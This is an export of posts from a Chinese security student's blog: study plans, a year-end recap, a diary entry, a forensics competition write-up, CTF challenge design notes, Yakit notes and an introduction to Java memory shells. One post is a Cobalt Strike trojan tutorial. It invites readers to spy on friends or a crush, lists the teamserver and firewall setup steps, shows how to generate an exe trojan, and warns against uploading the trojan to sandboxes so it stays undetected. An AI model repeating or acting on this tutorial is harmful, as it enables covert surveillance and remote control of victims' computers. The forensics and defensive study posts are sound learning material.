[{"title":"3月3--3月8计划任务","url":"/2025/03/02/3%E6%9C%883-3%E6%9C%888%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/","content":"Demon说要监督我\n\n \n每天坚持背单词35+然后复习单词50+，尽量纸质电子同步积累，英语课也要充分利用起来\n\n \n一周坚持运动5天，不能比上周胖\n\n \n根据Demon的任务完成四级题目\n\n \n完成玄机靶场第一章，并且写blog记录玄机的wp\n\n \n给学弟们申请晚自习假条\n\n \n给华子姐起步取证和应急响应\n\n \n每天坚持七点起床然后睡觉最晚不超过12点半\n\n \n有概率论和数据库课的当天要及时复习掌握，然后看视频或者做题消化吸收，保证自己的进度在老师前面并且完成每天的作业\n\n \n每天抖音限时1h\n\n \nburpsuite靶场这个月全部打\n\n\n","tags":["-日常 -计划"]},{"title":"2024年终总结","url":"/2025/01/29/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"其实看到大师傅们在元旦的时候写年终总结我就很是羡慕，但是当时自己没有blog并且也写了也不知道给谁看所以就一直拖着没写，但是我感觉这一年我有好多事情想写下来记录下来\n二月这个时候我还在梦想着如果大学期间能够拿一个国奖该是多么牛逼的存在，我的目标紧紧盯住24的华为ICT大赛，幻想着暑假猛猛学一波之后杀进国赛，同时我也深深对以后感到顾虑，我去青岛的线下课程班学习，但是效果还是很一般，只是把HCIP学到七八成的样子。\n三月开学的时候跟傻子一样帮班里的同学搬书，给我累死了我决定以后再也不会帮忙搬书了，然后最让我感到压力的是这个月我开始整大学生创新创业计划了，刘文荣老师给我洗脑快洗疯了，然后我也是因为不敢拒绝硬生生接下了这个任务弄了差不多一个周找了一些资料和理论然后加上对网工的熟悉和对学校老师水平的自信我开题了一个叫基于OTN和VPN技术的数据传输优化方案的项目但是我现在回头看感觉挺二逼的，但是我对这个项目的质量还是比较有信心的，谢飞帆老师给的评价是我做不出来，这个项目的水准至少是个优秀的硕士毕业论文，当时给我装爽了，同时也是这学期wsq学长开始接手实验室，我开始接触ctf。\n\n与此同时我也考了计算机等考的c语言二级，但是后来没过，哈哈其实我根本就是水逼平时有点东西全用来装逼了。\n四月四月份最令我印象深刻的就是XYCTF了，到现在我也认为XYCTF的题真的很合适，我也是从这个时候开始正式接触CTF，这个比赛维持了一个月，我知道了CTF原来是这么一回事，但是我努力了很久很久也不能自己做出来题目，我和我当时的搭档的分工大概是他主web我主misc，当时学习还属于是在b站上看ctf教程呢，但是到现在我也没看几个哈哈，一个zip伪加密搞了好几天才明白，还有爆破密码什么的我天天就是跟在学长屁股上要答案，他做出来我就问他要，但是当时的学长也是实力很有限，也是在这个时候我去找徐静老师要晚自习的假条以后晚自习就转战实验室了\n五月xyctf在半路就被夭折了，我的队友不知道从哪找的wp交了好几个flag被封号了，当时做题晕晕的，接着就是iscc的到来，五一假期就开始做iscc这是大学生榜单上的赛事，与此同时还有我的校赛也正在进行，wsq学长负责出题也给我们透了很多题目，但是他给他同班的人透题透更多，然后我就和我之前的web手暗中交流最后两个二等奖，第一名竟然是我同班的hy师傅，当时觉得他很牛很牛，然后这一期间web手黄同学和wsq闹掰了我就从中帮他们交流，然后就开始做iscc的题目，刚开始没想那么多，但是后来就学会了闲鱼学会了py，这也是我学的最快的时候，我所有的精力都放在怎么复现题目了，很多东西根本不明白，但是就是跟着wsq学长模仿，遇到问题就框框问，框框查。最后几天iscc的wp都变成公共的了，五块钱全都有然后最后几天的时候大家都在冲刺，服务器就没有正常的时候\n\n六月六月是我的噩梦，我打了CISCN，真是太痛苦了，学长py进南京线下了，我因为自己复现不出来那么多题错失去线下南京，坐牢两天，队友因为坐牢太难受了就不来了我很生气从此也对国赛有恐惧感。iscc给我定榜2016名差一点点国三，当时人生都很黑暗，心情很压抑。那么多美好的东西都理我擦肩而过。\n也就是说我一年下来什么都没得到，我的野心都变成了笑话，而隔壁实验室的同学都已经开始拿奖了，我甚至为了让我下学期有评奖评优的资格去调换了宿舍\n七月期末考试出成绩了考的很一般，我本来想争取国家奖学金的雄心壮志都稀碎了。然后一边挂着网课听华为一边又开始玩电脑，慢慢接触了src，一狠心直接付费学习钟北山，然后慢慢放弃网工的学习，这也意味着我之前的学习都打了水漂\n八月正式进攻web，开始抓包，开始尝试山东省教育系统攻防演练，开始和赵师傅接触变多，从这段时间开始我就经常骚扰赵师傅，因为别人不好意思问，而且赵师傅会挖洞，当时我就想如果我大三能有赵师傅的水平就好了，北山师傅给的入学考试我一道题也不会，然后给了我一套课让我学习，这段时间是我学习的时间也是我荒废的时间，我天天在家里告诉所有人我在学习但是实际上每天的有效学习还不到两个小时，一直到开学我才是会一点sql的原理，xss的原理，upload文件上传的东西，也是在这个时候，我逐渐感到网安的魅力，也学会了如何学习。\n九月开学了，我的web手不干了，本来就是比较古怪的人，后来刘文荣老师知道了以后去尝试调解也没成功，好像是因为我没有帮他报名比赛得罪他了，很抽象。至此23级只剩我一人并且刚刚入门，开学准备了一段时间的计算机三级但是也是很意外的没过，于是我决定我再也不会考计算机等考了，这个月把山东省赛打进去了，当时老师把校队名额给了凯哥我很不服当时还和凯哥不认识,然后我突然意识到好像到我负责今年的新生了然后我就开始筹备，一个人搞所有的东西真的很累很崩溃\n我还当学生代表和深信服的人去了解学校的合作，但是我感觉好坑人，不如自己学了，学校把钱花在这种地方很不值当\n十月假期没回家去青岛找xjh玩了一圈，然后就开始搞新生的事情，去招新的时候我真的焦虑死了，明明自己什么也不会但是还是要硬着头皮上，我不能让学弟学妹们像我大一一样艰苦，我想做一个好学长，像悲惨世界的冉阿让一样。然后院长还给我任务去把服务器搞下来利用上，感谢赵师傅一直在帮我捯饬。荣姐还任命我为网络安全社团的社长，同时也是我真正当上实验室负责人的时候。十月和十一月两个月，我每天忙的喘不过气，不敢睡懒觉，也不敢早睡每天都挤时间去忙，更别提学习了，去曲阜线下之后跟凯哥认识了，凯哥看我辛苦的折腾实验室给我说“行，青岛工学院隔了好几代人终于有个能撑起来的了”，然后每天我就给学弟学妹们答疑解惑，组织学习，给他们提供好的条件和学习路线。隔壁实验室的黄学长也逐渐熟络起来了，然后他告诉我iscc有个人工智能赛道，但是涉及到一些安全方向的内容，让我去帮忙一起做，我答应了还帮忙找了好几个人一起搞，然后认识了隔壁实验室比较优秀的同学们\n但是可惜的是山东省赛败兴而归。\n十一月十一月跟凯哥组队感谢凯哥带我拿下技能兴鲁的省三，我也拿了两个misc的二血，但是如果没有东道主给压力的话再加上工具齐全，我应该可以拿下两个一血和一个二血，akmisc。明年凯哥就离开学校了，需要我来顶上主力比赛了。凯哥也照顾了我很多很多，我对以后的规划也不再那么迷茫，凯哥是我认识的学长中最好的也是最牛的一个。\n然后我就去筹备校赛，服务器也收拾好了。\n十二月十二月一开始接到通知有个青岛市保密技术比赛，当时荣姐说看我太辛苦让我去带队，但是我知道自己实力不够，我带队不是最好的选择，于是我让赵师傅去了，明年我一定要去并且要拿下个人奖，还有济南的数据安全比赛因为和校赛冲突所以很遗憾没去成。\n这个月还能去厦门的因为iscc那边也打进线下了线下是厦门，是一个美好的人生经历，但是由于资金和时间问题和长城杯初赛冲突了我不能去不过队长也是很争气抱了一个国二回来。长城杯，我带二队，学长们去一队，好消息是我们都进线下了，赛制还不清楚但肯定会被打烂的。\n也是在这个月，学弟们开始展露锋芒了，sun师傅，扬秋师傅，咸鱼师傅，小黄鼠狼师傅Wea5e1还有年龄比我大的学弟涵哥，他们同样很优秀，剩下的学弟学妹们也是远超我大一的进度我感觉他们都很牛。\n一月一月五号的时候有个软件安全赛差点没报上，不过也是顺利进入南京线下，圆梦了，第一次自己带队去和学弟们打，第二天还要考两门期末，现在坐等线下拿奖嘻嘻\n我在家里疯狂压力学弟们，跟Demon也熟络起来组了很多比赛，还在尝试健身，接下来的一段时间我需要改变一下方向了，去试试src，比赛慢慢放给学弟们，打完25年山东省赛我就退役，必须拿下个人奖\n总结大二的这个学期真是充实到爆炸，几乎每天都在忙碌\n幸好有学长们的帮助，学弟们也很争气，我的付出都是值得的也希望学弟们能握住接力棒把实验室搞起来.\n","tags":["-随笔"]},{"title":"20250207","url":"/2025/02/07/20250207/","content":"今天12点多因为太饿了所以决定早睡，但是没有早起，赖床赖到八点五十，起床把昨天买的手擀面煮上了，放了一点鸡精 耗油 生抽 和好几个鸡蛋。美美的吃完了早饭，香拽了！然后就是困~ 晕碳吗？\n吃完发现体重多了快两公斤，但是我感觉我进肚里的东西还没一斤呢。反复称了好几次，称到了一个满意的体重,我才放过不听话的体重秤。本来打算吃完就去运动消化一下，别吃胖了前功尽弃，但是去锻炼的路上突然遭遇罪大恶极怨念缠身的恶床，为了拯救世界不让它破坏世界和平，我毅然决然变成小猪🐖睡服它。\n一直睡到11点半它才肯罢休，真是 太可恶了。二次起床之后我去给pwnpwn（胖胖）喂奶，它跟恶鬼一样裹着奶嘴就吨吨吸，鼻子全是奶泡也停不下来。\n今天真爽，嘻嘻。吃饭真好👍\n","tags":["-随笔"]},{"title":"CS制作木马的简易小教程（纯娱乐不要拿来干坏事！）","url":"/2025/02/18/CS%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%9A%84%E7%AE%80%E6%98%93%E5%B0%8F%E6%95%99%E7%A8%8B%EF%BC%88%E7%BA%AF%E5%A8%B1%E4%B9%90%E4%B8%8D%E8%A6%81%E6%8B%BF%E6%9D%A5%E5%B9%B2%E5%9D%8F%E4%BA%8B%EF%BC%81%EF%BC%89/","content":"想要制作小木马控制一下你的亲朋好友或者窥探一下女神的隐私吗\n那就让我来教教你\n首先就是得有个VPS云服务器，我就只学了cs制作exe文件的木马还有一种shellcode我还没研究所以就以window下的exe当例子咯\n先去极核那边把这个cs下上https://get-shell.com/1554.html\n强烈推荐极核网站真的很好🤩\n然后先说一下这个的原理，我找到的几个教程全是步骤没有原理导致我笨笨的在kali里面捯饬\ncs的使用是分为客户端和服务端的，服务端必须是linux环境，然后按照公网的来的话，就是需要你在Linux环境下开启server的服务，让cs客户端能够和服务端连接上去，只有这样cs才能启动，\n然后放几个我看的教程链接\t工具分享 | CobaltStrike安装与简单使用          \n我的服务器的环境是centos 这个是centos的java环境配置\n首先就是服务端需要Java环境,具体的其他操作可以去网上查，我只说我用的最方便无脑的方法\n利用yum源来安装jdk（此方法不需要配置环境变量） 查看yum库中的java安装包 ：yum -y list java* 安装需要的jdk版本的所有java程序：yum -y install java-1.8.0-openjdk* (安装完之后，默认的安装目录是在: &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-1.8.0-openjdk-1.8.0.151-1.b12.el7_4.x86_64)\n然后输入java -version\n\n这样就是正常了\n然后这个时候你的安装包应该是下好了解压之后是这样的\n\n去把Server想办法放到服务端里面，用什么协议也好，传zip也行，我是直接finalshell拖进去的，完成后进入到Server的目录下对teamserver文件增加执行权限 \tchmod +x teamserver \t然后就得把这个服务端的服务起来了\n在下一步之前你要知道如果你是买的云服务器的话，你必须要干的一件事就是去安全组里面把入规则改一下，运行all 对你设定的端口进行tcp连接，如果不太懂得话那就按照我这个样子改一下就欧克\n\n记得也要在Linux本机上面开放端口\n开放端口\nfirewall-cmd –zone&#x3D;public –add-port&#x3D;5672&#x2F;tcp –permanent  # 开放5672端口\nfirewall-cmd –zone&#x3D;public –remove-port&#x3D;5672&#x2F;tcp –permanent #关闭5672端口\nfirewall-cmd –reload  # 配置立即生效\n改成50050端口就行这是cs默认得，记得一定要进行配置立即生效的命令要不然要等很久\n1、启动服务端。\n.&#x2F;teamserver 127.0.0.1 passwd    \t\t#127.0.0.1服务端真实IP（最好写公网ip） 后面密码随意。\n\n大概是这样，如果报错了记得问ai解决，应该是问题不大了\n然后就是去客户端把cs连上了\n\n\nHOST就是你服务器的公网ip port都是自定义的不被占用就是，默认都是50050 password就是你命令里面设置那个\n以上属于是调试cs了，然后下面才是目的—生成木马\n\n\n\n然后有监听了就去生成exe\n\n\n然后你就可以有一个小木马咯\n记得不要扔到微步或者别的云沙箱 赵师傅告诉我说如果扔进去了你的这个exe的服务器ip会被记住然后就很难过免杀了\n以后有空我再去研究一下如果过免杀哈哈\n","tags":["-WEB -渗透 -木马"]},{"title":"FIC取证初赛复现","url":"/2025/03/18/FIC%E5%8F%96%E8%AF%81%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"y\n一上来就遇到问题了 想要复现取证的题目一定要准备一个大硬盘 保守估计500G+ 才能够用然后需要一个百兆的网络和百度网盘的会员 （你怎么知道我给学校校园网破了现在是千兆网 只不过百度网盘限速到百兆） 趁着刚打完痛苦的ciscn暨长城杯之后我决心继续猛猛学习主要是手里面还有弘连的火眼想爽一把取证梭哈的感觉不是\n第一步就是这个该死的挂载 一开始懵懵的不知道是啥文件还傻乎乎问C3 C3说用file查一下 我电脑还没装wsl（有空一定装备）然后想起来vc了就胡乱搞结果还真是vc直接挂载了好神奇\n\n然后就是熟悉的镜像文件了\n\n手机检材题目描述2024年4月，卢某报案至警方，声称自己疑似遭受了“杀猪盘”诈骗，大量钱财被骗走。卢某透露，在与某公司交流过程中结识了员工李某。李某私下诱导卢某参与赌博游戏，起初资金出入均属正常。但随后，李某称赌博平台为提升安全性，更换了地址和玩法，转为通过群聊抢红包形式进行赌博。随着赌资不断增加，卢某投入巨额资金后，发现无法再访问该网站，同时李某也失去联系，卢某遂意识到自己被骗。 在经济压力下，卢某选择报警，并承认参与赌博活动，愿意承担相应法律后果。警方依据卢某提供的线索和手机数据，迅速锁定犯罪团伙，并在一藏匿地点成功抓获犯罪嫌疑人李某和赵某。警方对嫌疑人持有的物品进行了证据固定：李某手机被标记为检材1，窝点内服务器为检材2，赵某使用的计算机为检材3。 接下来，请取证工作者根据案情和这些检材进行深入分析，并解答后续问题。\n手机部分1嫌疑人李某的手机型号是？\n\n \nA. Xiaomi MI 2s\n\n \nB. Xiaomi MI 4\n\n \nC. Xiaomi MI 6\n\n \nD. Xiaomi MI 8\n\n\n\n思路是型号肯定在很多配置文件里面存在 存在的情况下我们全局里面搜索看看有没有泄露出来的 很顺利在文件内容里面就搜索出来了\n不过我一开始是在文件里面看 发现找不到 \n手机部分2嫌疑人李某是否可能有平板电脑设备，如有该设备型号是？\n\n \nA. iPad Pro 11\n\n \nB. Vivo Pad 2\n\n \nC. MatePad Pro\n\n \nD. Xiaomi Pad 6s\n\n直接就能找到\n\n\n手机部分3嫌疑人李某手机开启热点设置的密码是?\n\n5aada11bc1b5\n手机部分4嫌疑人李某的微信内部ID是？\n\nwxid_wnigmud8aj6j12\n手机部分5嫌疑人李某发送给技术人员的网站源码下载地址是什么？\n去微信里面一个个翻聊天记录能找到这个\n然后扫二维码得到新佛曰 解码即可\n\n\nhttp://www.honglian7001.com/down\n手机部分6翻聊天记录的时候就已经找到了受害人 但是一开始以为让提交vx号结果不对 然后就是提交受害者的id\n\nlimoon890\n手机部分7嫌疑人李某第一次连接WIFI的时间是？\n进去后搜索wifi 有一个wificonfig的xml文件\n\n A. 03-14 15:55:57\n B. 03-14 16:55:57\n C. 03-14 17:55:57\n D. 03-14 18:55:57\n\n\n手机部分88、分析嫌疑人李某的社交习惯，哪一个时间段消息收发最活跃？\n\n A. 12:00-14:00\n B. 14:00-16:00\n C. 16:00-18:00\n D. 18:00-20:00\n\n\n这题纯白给\n手机部分9请分析嫌疑人手机，该案件团伙中，还有一名重要参与者警方未抓获，该嫌疑人所使用的微信账号ID为？\n老苏的vxid\n\n手机部分10请分析嫌疑人手机，嫌疑人老板组织人员参与赌博活动，所使用的国内访问入口地址为？[格式：127.0.0.1:8080&#x2F;admin]\n\nwindows部分window1分析技术员赵某的windows镜像，并计算赵某计算机的原始镜像的SHA1值为？\n\nwindows2分析技术员赵某的windows镜像，疑似VeraCrypt加密容器的文件的SHA1值为？\nB25E2804B586394778C800D410ED7BCDC05A19C8\n\n\n执行火眼耗时任务中的特征分析寻找加密文件，识别得到加密容器2024.ifc，计算其SHA1值即可。 就是要等很久很久 才能找到比较烦人 一开始我还以为我的火眼坏掉了\nwindow3据赵某供述，他会将常用的密码放置在一个文档内，分析技术员赵某的windows镜像，找到技术员赵某的密码字典，并计算该文件的SHA1值?\n\nwindow4据赵某供述，他将加密容器的密码隐写在一张图片内，隐写在图片中的容器密码是？\nqwerasdfzxcv\n\n\n在Documents目录下，有一张名为pswd.jpg图片疑似嫌疑人供述的密码图片，使用该密码及上述容器发现挂载失败。查看该图片十六进制试图，在尾部找到密码qwerasdfzxcv。\nwindow5分析技术员赵某的windows镜像，bitlocker的恢复密钥是什么？\n\nVC挂载 密码是第四题找到的\nwindow6\nwindow7\n分析技术员赵某的windows镜像，默认的浏览器是？\n显而易见\n这里需要仿真一下 进去比较容易做出来\nwindow8分析技术员赵某的windows镜像，私有聊天服务器的密码为：\n\nwindow9分析技术员赵某的windows镜像，嫌疑人计算机中有疑似使用AI技术生成的进行赌博宣传的图片，该图片中，宣传的赌博网站地址为？\n一翻就有\n\nwindow10分析技术员赵某的windows镜像，赵某使用的AI换脸工具名称为？\n\n A. stable diffusion\n B. ROOP\n C. Midjourney\n D. DiffusionDraw\n\n\n这个是对着wp做的 不太理解，但是也微微能懂 属于微解😎\nwindow11分析技术员赵某的Windows镜像，使用AI换脸功能生成了一张图片，该图片的名称为：\n\ndb.jpg\n\n\nwindow12分析技术员赵某的Windows镜像，ai换脸生成图片的参数中–similar-face-distance值为：\n\n但是我的火眼真没找到这个地方 不知道为什么\nwindow13分析技术员赵某的Windows镜像，嫌疑人使用AI换脸功能所使用的原始图片名称为\n跟上面的解法一样 但是我还是找不到\n\nwindow14分析技术员赵某的Windows镜像，赵某与李某沟通中提到的“二维码”解密所用的网站url地址为？ \n\nhttp://hi.pcmoe.net/buddha.html\n\nwindow1515、分析技术员赵某的Windows镜像，赵某架设聊天服务器的原始IP地址为？\n\n192.168.8.17\n\nwindow1616、分析技术员赵某的Windows镜像，据赵某交代，其在窝点中直接操作服务器进行部署，环境搭建好了之后，使用个人计算机登录聊天室进行沟通，请分析赵某第一次访问聊天室的时间为？\n\n A. 2024-03-14 20:30:08\n B. 2024-03-14 20:31:08\n C. 2024-03-14 20:32:08\n D. 2024-03-14 20:33:08\n\nwindow17分析技术员赵某的Windows镜像，openwrt的后台管理密码是：\n\n在谷歌浏览器里面的保存的密码可以直接找到\nwindow1818、分析技术员赵某的Windows镜像，嫌疑人可能使用什么云来进行文件存储？\n\n易有云\n\nwindow19\nwindow20\n最后几个基本上都在加密的挂载里面 很好找\n","tags":["-forensics -wp"]},{"title":"Dectf MISC出题思路","url":"/2025/03/11/MISC%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/","content":"MISC出题思路\n100简单：Owidth兽语或者佛曰迷惑 实则零宽隐写\nDem0n说她好胖😭然后甩我个经典语录\n随波逐流语录‌‌‌‌‍‍﻿﻿：‌‌‌‌‌﻿‍‍‌‌‌‌‍‬‬‌‌‌‌‌‍‬‬‍‌‌‌‌‍‍﻿﻿‌‌‌‌‍‌‍‌‌‌‌‌‌﻿‌﻿‌‌‌‌‍‬﻿‍‌‌‌‌‌﻿‌‌‌‌‌‌‍‬﻿‬‌‌‌‌‍‍﻿﻿‌‌‌‌‍‬‌‬‌‌‌‌‍﻿‍‍流逐逐波随浪波随波随浪波逐波波浪波逐流波洪流随随浪波逐流逐洋逐随逐流流流波随洋波波逐波波流逐波洋逐随逐波逐随随波洋波波随波流随流流洋逐随随随逐逐波波‌‌‌‌‍‍\nflag{q1_5hi_D3m0n_bu_pwn}\n100 OSINT\nflag{齐鲁驾校}\n150开学了 记得mm不记得xhWea5e1开学要抢课迫在眉睫了，大学的第二个学期就只能眼睁睁得看着别人把好课抢走吗，他现在只记得密码不记得学号了，然后他问导员要学号，剑刃导员却给了一串这个 88bd91a429e2bf0d275e5005286d91a77ce1cefd 还剑剑得说反正你是打CTF的，你肯定随手就解了,但是剑就剑在这个哈希是 学号+2025 (不是加法是位数) 的值不是学号的哈希，于是Wea5e1求助帅气的学长大人Lww\nLww告诉Wea5e1他的blog里面有学号的规律\n2024020611022025\n考点hash爆破 爆破学号给出学号的规则 学号的hash\n提示1：flag{学号}\n提示2：sha1\nflag{202402061102}\n300中难：嘛嘛嘛 嘛嘛嘛 嘛嘛嘛音频类隐写图片  表面mp3 实际是wav文件 silenteye藏图片的十六进制表面png实际jpg\n​    图片盲水印给出提示 base   Z64码表改变并且 给出flag格式\n木马exe拿出来十六进制扔到TXT 找到回连的ip flag{hash(ip)}\n提示：安静点，用眼看\n400困难：这里空空的正常Excel表是zip 下面藏一个flagzip  zip里面无名文件（windows无法执行空白文件） 文件里面是异或flag 异或值是1020\nflag.zip要用解压软件拿出来才行不能正常解压在压回去（知识点是压回去会导致文件结构发生变化不适配excel的文件结果xml文件发生变化） excel表一直正常 改变出题思路直接隐写excel 隐藏的sheet表里有异或提示\nW\\SWJtW]␁^␟␁␄␝PUPEFYWE^M\nflag{Dem0n-15-beautiful}\n提示：zip里面的文件怎么没有名字？\n这样看起来也简单的\n","tags":["-CTF -WP -MISC"]},{"title":"Yakit学习","url":"/2025/02/15/Yakit%E5%AD%A6%E4%B9%A0/","content":"先汇报一下近况，没咋学习，本身打算好好学习一下反序列化和ssti的但是一直犯懒不想学，这几天有个项目我看着挺好的，给本地的国企培训渗透测试一天1.5k，一整套下来1.5w真是馋死我了，但是水平真是有限，我都谎称自己大三了还是没看上我，甚至连面试的环节都没有。我还在内心纠结了很久很久我到底能不能干这个活\n\n本来的算盘是进阶web实力的但是现在看来我好像也对ctf没有那么那么渴望。感觉自己挺不负责的还没啥毅力和耐心，先不管了，反正是打算学着用用yakit然后熟悉熟悉渗透测试的。刚才搞这个破图床搞了好久感觉也没搞明白乱七八糟的先不管了回头在调整吧。真是烦死了，感觉自己真是笨死了，那些大牛子们为什么会那么多东西哇？😑😑😑\nyakit是yak延申出来的一个gui yaklang可以理解为一个专门为网络安全而生的语言，用来开发各种平台产品之类的，从golang延伸出来的：它旨在简化渗透测试、漏洞利用、安全工具开发等任务，提供高度集成化的安全功能模块和便捷的语法，帮助安全研究人员快速实现复杂的攻防场景。\n\nMITM（man-in-the-middle）操作台&#x3D;&#x3D;burpsuite\n这里放上链接Yakit下载和安装等教程都非常详细这里不进行过多赘述\n然后就是yakit有个本地模式和远程模式，对于我来说目前用不上远程模式哈哈\n如果会玩bp可以直接省略yakit的学习了，因为我听了点视频发现没啥内容能记录下来。\n【【干货】Yakit使用教程01-入门简介与安装教程】https://www.bilibili.com/video/BV1Cg4y1u7VD?vd_source=549b9e183402012ff590dc727d995039放上官方的教程自己看吧\n补充一点，我在进行yakit本地靶场测试的时候，有的题目是可以直接hackerbar解决但是为了熟悉yakit 所以我决定用yakit麻烦点去做，但是一直抓不到本地靶场的包，所以经过快一周的测试和研究当然也是主要没怎么研究光研究图床为什么不通了。\n最后找到一个问题的关键点就是，代理自动设置成了本地主机不经过代理，所以也就抓不到包。用这个思路基本上就能解决了,\n","tags":["-渗透 -web -yakit -学习"]},{"title":"初识内存马","url":"/2025/03/11/%E5%88%9D%E8%AF%86%E5%86%85%E5%AD%98%E9%A9%AC/","content":"最近备赛 天津的CISCN长城杯线下。疯狂刷玄机靶场的应急响应，但是做的很粗糙，基本上就是对着wp过一遍，很多东西来不及消化和吸收，但是也是对应急响应逐渐熟悉起来了，以前一直不太清楚应急响应是啥 之前还感觉跟取证是一块内容哈哈。\n玄机打完前七章了，也没抽空写wp，但是也不打算写了 Peterpan.exe师傅的wp我就是写质量也不如他写得好 所以干脆不写了 疯狂推荐Peterpan.exe的玄机wp虽然已经推荐过了。\n第八章涉及到java内存马 虽说是排查但是必然是要了解一下的 感觉是一块大内容所以打算专门抽空学习一下这个内容，感觉以后不可避免的绕不开。\n应急响应——全类型JAVA内存马排查\n言归正传：\n内存马是啥内存马，也被称为无文件马，是无文件攻击的一种常用手段。内存马是无文件攻击的一种技术手段，那我们不得不先简单介绍一下无文件攻击。无文件攻击可以有效地躲避传统安全软件的检测，它们可以在系统的内存中远程加载执行、驻留在注册表中或滥用常用的白名单工具，例如PowerShell，Windows Management Instrumentation（WMI）和PsExec等。无文件攻击技术允许攻击者访问系统，从而启用后续的恶意活动。通过操纵漏洞利用程序、合法工具、宏和脚本，攻击者可以破坏系统、提升特权或在网络上横向传播恶意代码。而且，无文件威胁在执行后不会留下任何痕迹，这使其难以被检测和清除。\nWebshell内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的Webshell都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，给检测带来巨大难度。而内存攻击者正是利用软件安全漏洞，构造恶意输入导致软件在处理输入数据时出现非预期错误，将输入数据写入内存中的某些特定敏感位置，从而劫持软件控制流、执行流，转而执行外部输入的指令代码，造成目标系统被获取远程控制，让内存马的攻击得以实现。\nwebshell的变迁过程大致如下所述：\nweb服务器管理页面——&gt; 大马——&gt;小马拉大马——&gt;一句话木马——&gt;加密一句话木马——&gt;加密内存马\n\n\n[!TIP]\n背景知识\njavaweb的三大件：Servlet Filter  Listener\nServletServlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。\n\n请求的处理过程：客户端发起一个http请求，比如get类型。Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。Servlet容器调用service()方法。service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。doXXX方法中是我们自己写的业务逻辑。业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。容器关闭时候，会调用destory方法\n\nServlet和JSP的关系？JSP（全称Java Server Pages） JSP经过转换编译以后还是会变成Servlet，支持前 端语法。 View：JSP，负责内容显示 Controller：Servlet，负责处理请求\nServlet和Tomcat的关系Tomcat里面有Servlet容器（引擎）\nTomcat可以提供HTTP访问\nTomcat可以把HTTP请求转换为HttpServletRequest对象，并调用doGet/doPost，并且把HttpServletResponse转换为HTTP响应内容\n\nFilterfilter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。\n\n过程：1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。  2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。  3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。  4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。  5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。  6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。 \n\nListenerJavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。\nServletContextListener：对Servlet上下文的创建和销毁进行监听；ServletContextAttributeListener：监听Servlet上下文属性的添加、删除和替换；\nHttpSessionListener：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。\nHttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听；\nServletRequestListener：对请求对象的初始化和销毁进行监听；ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。\n用途\n可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。\n内存马应用理解想要接管web应用的处理逻辑，其实就是两种方法，一种是直接篡改他，一种是顺着他利用其自己的一些特性去接管他；就是如下两种方法：\n\n研究如何去修改jvm里面的web应用一些处理逻辑类的实现，从而实现修改web应用的处理逻辑；\n\n顺着web应用来，利用web应用自身的可拓展性，比如其一些服务组件可以动态的增添的特性来实现接管web应用对请求的处理逻辑；\n\n\n同时这里我们也可以看出第一种方法的处理范围一定程度上肯定是比第二种大的，但是这里并不是包含关系，一个是对类的实现篡改，一个是添加；\n首先我们要了解排查的原理，对于这类的内存马，是通过添加一些组件实现的，每种组件都有一个父类，我们可以遍历jvm里面的所有类，找到继承了上面三种公共父类的类或者是实现的公共接口，又或者是找到这些类的其他公共特征，然后输出类名及路径开展排查，一般来说比较简单粗暴的排查方法可以借助内存马的性质来做，即观察本地是否存在相关类文件落地，没有就是重点怀疑对象；\n（学不明白 java底子不好 不太能理解 我觉得先当脚本小子去，也是应了题目了 初时java内存马哈哈）\n","tags":["-WEB -应急响应 